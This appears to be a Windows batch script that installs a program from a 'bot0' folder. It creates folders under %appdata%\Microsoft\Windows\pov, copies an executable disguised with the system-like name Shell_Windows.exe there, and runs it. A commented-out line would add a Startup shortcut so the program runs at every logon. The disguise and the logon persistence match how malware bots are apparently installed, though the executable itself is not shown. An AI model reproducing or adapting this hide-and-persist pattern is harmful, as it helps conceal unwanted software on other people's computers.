@ECHO off 
cd %appdata%\Microsoft\Windows && mkdir pov
cd %appdata%\Microsoft\Windows\pov && mkdir media && mkdir vers
copy "C:\bot0\Shell_Windows.exe" "%appdata%\Microsoft\Windows\pov\Shell_Windows.exe"
@REM copy "C:\bot0\Shell_Windows.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Shell_Windows.lnk"
"%appdata%\Microsoft\Windows\pov\Shell_Windows.exe "
pause
